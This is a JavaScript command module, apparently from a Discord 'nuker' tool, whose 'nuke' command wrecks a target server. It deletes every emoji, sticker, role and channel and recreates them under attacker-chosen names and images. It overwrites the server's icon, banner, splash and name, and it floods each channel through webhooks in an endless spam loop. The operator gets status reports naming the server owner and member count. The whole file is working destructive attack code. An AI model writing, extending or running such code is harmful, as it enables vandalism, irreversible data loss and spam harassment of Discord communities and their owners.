const log = require("../../logger");
const chalk = require("chalk");
const stats = require("../../statistics");
const { ChannelType } = require("discord.js");

module.exports = {
  name: "nuke",
  description: "Nukes the guild.",
  aliases: [],
  usage: "nuke [-m <amount>]",
  flags: { "-m": "Max amount bypass" },
  run: async function (client, args, flags) {
    const guild = client.target_guild;
    if (
      log.input(
        `Are you sure you want to nuke ${chalk.bold.white(guild.name)}? (y/n)`,
        client
      ) !== "y"
    )
      return log.success("Aborted.");
    const max_amount = flags["-m"] || 10;

    // questions
    const replace_channels = log.input(
      "Do you want to replace channels? (y/n) ",
      client
    );
    const replace_roles = log.input(
      "Do you want to replace roles? (y/n) ",
      client
    );
    const replace_emojis = log.input(
      "Do you want to replace emojis? (y/n) ",
      client
    );
    const replace_stickers = log.input(
      "Do you want to replace stickers? (y/n) ",
      client
    );
    const replace_art = log.input(
      "Do you want to replace the assets (icon, banner, invite splash)? (y/n) ",
      client
    );
    const replace_name = log.input(
      "Do you want to replace the guild name? (y/n) ",
      client
    );
    const spam = log.input("Do you want to spam? (y/n) ", client);

    var url = "";
    if (
      replace_emojis === "y" ||
      replace_stickers === "y" ||
      replace_art === "y"
    ) {
      url = log.input(
        "What should the new image url be (emojis/stickers/art)? ",
        client
      );
    }

    var name = "";
    if (
      replace_channels === "y" ||
      replace_roles === "y" ||
      replace_emojis === "y" ||
      replace_stickers === "y"
    ) {
      name = log.input(
        "What should the new name(s) be (channels/roles/emojis/stickers)? ",
        client
      );
    }

    var message = "";
    if (spam === "y") {
      message = log.input("What should the spammed message be? ", client);
    }

    // COMFIRMATION
    if (
      log
        .input(
          `Are you sure you want to nuke ${chalk.bold.white(
            guild.name
          )}? This CAN NOT be undone! (y/n)`,
          client
        )
        .toLowerCase() !== "y"
    )
      return log.success("Aborted.");

    stats.nukes(guild);
    const owner = await guild.fetchOwner();
    await client.webhook.send({
      username: client.user.tag,
      avatarURL: client.user.avatarURL(),
      content: `\`\`\`ansi\n☢ : [2;33mNuke[0m started!\n🎯 : [2;37m${guild.name}[0m | [2;37m${guild.id}[0m\n👪 : [2;37m${guild.memberCount}[0m members\n👑 : [2;37m${owner.user.tag}[0m | [2;37m${owner.id}[0m\n\`\`\``,
    });

    // replace emojis
    if (replace_emojis === "y") {
      const emoji_lenght = max_amount;
      log.info("Replacing emojis...");

      var deletions = 0;
      await guild.emojis.cache.forEach(async (emoji) => {
        await emoji
          .delete(`🧨`)
          .then((c) => {
            log.success(
              `Deleted emoji ${chalk.white(
                ":" + emoji.name + ":"
              )} | ${chalk.white(emoji.id)}`
            );
            deletions++;
          })
          .catch((err) => {
            log.error(
              `Failed to delete emoji ${chalk.white(emoji.id)} | ${err}`,
              "src/commands/nuke/nuke.js"
            );
          });
      });
      log.info("Deleted emojis.");
      stats.emojis_delete(deletions, guild);
      await client.webhook.send({
        username: client.user.tag,
        avatarURL: client.user.avatarURL(),
        content: `\`\`\`ansi\n🧨 Deleted emojis! [2;37m${deletions}[0m\n\`\`\``,
      });

      var creations = 0;
      const prefix = name + "_";
      for (let i = 0; i < emoji_lenght; i++) {
        await guild.emojis
          .create({
            attachment: url,
            name: (prefix + Math.random().toString(36).substring(2, 5)).replace(
              "-",
              "_"
            ),
          })
          .then((emoji) => {
            log.success(
              `Created emoji ${chalk.white(
                ":" + emoji.name + ":"
              )} | ${chalk.white(emoji.id)}`
            );
            creations++;
          })
          .catch((err) => {
            log.error(
              `Failed to create emoji ${chalk.white(
                ":" + name + ":"
              )} | ${err}`,
              "src/commands/nuke/nuke.js"
            );
          });
      }
      log.success("Replaced emojis.");
      stats.emojis_create(creations, guild);
      await client.webhook.send({
        username: client.user.tag,
        avatarURL: client.user.avatarURL(),
        content: `\`\`\`ansi\n🧨 Created emojis! [2;37m${creations}[0m\n\`\`\``,
      });
    }

    // replace stickers
    if (replace_stickers === "y") {
      const sticker_lenght = max_amount;
      log.info("Replacing stickers...");

      var deletions = 0;
      await guild.stickers.cache.forEach(async (sticker) => {
        await sticker
          .delete(`🧨`)
          .then((c) => {
            log.success(
              `Deleted sticker ${chalk.white(sticker.name)} | ${chalk.white(
                sticker.id
              )}`
            );
            deletions++;
          })
          .catch((err) => {
            log.error(
              `Failed to delete sticker ${chalk.white(sticker.id)} | ${err}`,
              "src/commands/nuke/nuke.js"
            );
          });
      });
      log.info("Deleted stickers.");
      stats.stickers_delete(deletions, guild);
      await client.webhook.send({
        username: client.user.tag,
        avatarURL: client.user.avatarURL(),
        content: `\`\`\`ansi\n🧨 Deleted sticker! [2;37m${deletions}[0m\n\`\`\``,
      });

      var creations = 0;
      const prefix = name + "_";
      for (let i = 0; i < sticker_lenght; i++) {
        await guild.stickers
          .create({
            file: url,
            name: prefix + Math.random().toString(36).substring(2, 5),
            tags: "🧨",
          })
          .then((sticker) => {
            log.success(
              `Created sticker ${chalk.white(sticker.name)} | ${chalk.white(
                sticker.id
              )}`
            );
            creations++;
          })
          .catch((err) => {
            log.error(
              `Failed to create sticker ${chalk.white(name)} | ${err}`,
              "src/commands/nuke/nuke.js"
            );
          });
      }
      log.success("Replaced stickers.");
      stats.stickers_create(creations, guild);
      await client.webhook.send({
        username: client.user.tag,
        avatarURL: client.user.avatarURL(),
        content: `\`\`\`ansi\n🧨 Created stickers! [2;37m${creations}[0m\n\`\`\``,
      });
    }

    // replace roles
    if (replace_roles === "y") {
      var roles_lenght = max_amount;
      log.info("Replacing roles...");

      var deletions = 0;
      await guild.roles.cache.forEach(async (role) => {
        await role
          .delete(`🧨`)
          .then((c) => {
            log.success(
              `Deleted role ${chalk.white("@" + role.name)} | ${chalk.white(
                role.id
              )}`
            );
            deletions++;
          })
          .catch((err) => {
            log.error(
              `Failed to delete role ${chalk.white(role.id)} | ${err}`,
              "src/commands/nuke/nuke.js"
            );
          });
      });
      log.info("Deleted roles.");
      stats.roles_delete(deletions, guild);
      await client.webhook.send({
        username: client.user.tag,
        avatarURL: client.user.avatarURL(),
        content: `\`\`\`ansi\n🧨 Deleted roles! [2;37m${deletions}[0m\n\`\`\``,
      });

      for (let i = 0; i < roles_lenght; i++) {
        await guild.roles
          .create({
            name: name,
            color: "Random",
            reason: "🧨",
          })
          .then((role) => {
            log.success(
              `Created role ${chalk.white("@" + role.name)} | ${chalk.white(
                role.id
              )}`
            );
            creations++;
          })
          .catch((err) => {
            log.error(
              `Failed to create role ${chalk.white("@" + name)} | ${err}`,
              "src/commands/nuke/nuke.js"
            );
          });
      }
      log.success("Replaced roles.");
      stats.roles_create(creations, guild);
      await client.webhook.send({
        username: client.user.tag,
        avatarURL: client.user.avatarURL(),
        content: `\`\`\`ansi\n🧨 Created roles! [2;37m${creations}[0m\n\`\`\``,
      });
    }

    // replace art
    if (replace_art === "y") {
      log.info("Replacing assets...");
      await guild.setIcon(url);
      await guild.setBanner(url);
      await guild.setSplash(url);
      log.success("Replaced assets.");
    }

    // replace name
    if (replace_name === "y") {
      log.info("Replacing name...");
      await guild.setName(name);
      log.success("Replaced name.");
    }

    // replace channels
    if (replace_channels === "y") {
      const channel_lenght = max_amount;
      log.info("Replacing channels...");

      var deletions = 0;
      await guild.channels.cache.forEach(async (channel) => {
        const type_text =
          channel.type === ChannelType.GuildVoice
            ? "voice"
            : channel.type === ChannelType.GuildCategory
            ? "category"
            : "text";
        const type_icon =
          type_text === "voice" ? "🔊" : type_text === "category" ? "📁" : "#";
        await channel
          .delete(`🧨`)
          .then((c) => {
            log.success(
              `Deleted ${type_text} channel ${chalk.white(
                type_icon + channel.name
              )} | ${chalk.white(channel.id)}`
            );
            deletions++;
          })
          .catch((err) => {
            log.error(
              `Failed to delete ${type_text} channel ${chalk.white(
                channel.id
              )} | ${err}`,
              "src/commands/nuke/nuke.js"
            );
          });
      });
      log.info("Deleted channels.");
      stats.channels_delete(deletions, guild);
      await client.webhook.send({
        username: client.user.tag,
        avatarURL: client.user.avatarURL(),
        content: `\`\`\`ansi\n🧨 Deleted channels! [2;37m${deletions}[0m\n\`\`\``,
      });

      var creations = 0;
      for (let i = 0; i < channel_lenght; i++) {
        await guild.channels
          .create({ name: name, reason: "🧨", type: ChannelType.GuildText })
          .then((channel) => {
            log.success(
              `Created channel ${chalk.white(
                "#" + channel.name
              )} | ${chalk.white(channel.id)}`
            );
            creations++;
          })
          .catch((err) => {
            log.error(
              `Failed to create channel ${chalk.white("#" + name)} | ${err}`,
              "src/commands/nuke/nuke.js"
            );
          });
      }
      log.success("Replaced channels.");
      stats.channels_create(creations, guild);
      await client.webhook.send({
        username: client.user.tag,
        avatarURL: client.user.avatarURL(),
        content: `\`\`\`ansi\n🧨 Created channels! [2;37m${creations}[0m\n\`\`\``,
      });
    }

    // spam
    if (spam === "y") {
      const channels_map = await guild.channels.fetch(undefined, {
        force: true,
      });
      const channels = channels_map.map((c) => c);

      var webhooks_map = {};
      for (const channel of channels) {
        var webhook = webhooks_map[channel.id];
        if (webhook === undefined) {
          webhook = await channel.createWebhook({
            name: name || message,
            avatar: url,
          });
          webhooks_map[channel.id] = webhook;
          log.success(`Created webhook for ${chalk.white("#" + channel.name)}`);
        }
      }
      log.success("Created webhooks.");

      const webhooks = Object.values(webhooks_map);

      log.info("Spamming... (if you want to stop, press CTRL + C)");
      while (true) {
        for (const webhook of webhooks) {
          await webhook.send(message);
          log.success(
            `Send message in ${chalk.white(
              "#" + webhook.channel.name
            )} | ${chalk.white(webhook.channel.id)} > ${chalk.white(
              '"' + message + '"'
            )} // "CTRL + C" TO STOP`
          );
          stats.messages(1, guild);
        }
      }
    }
  },
};
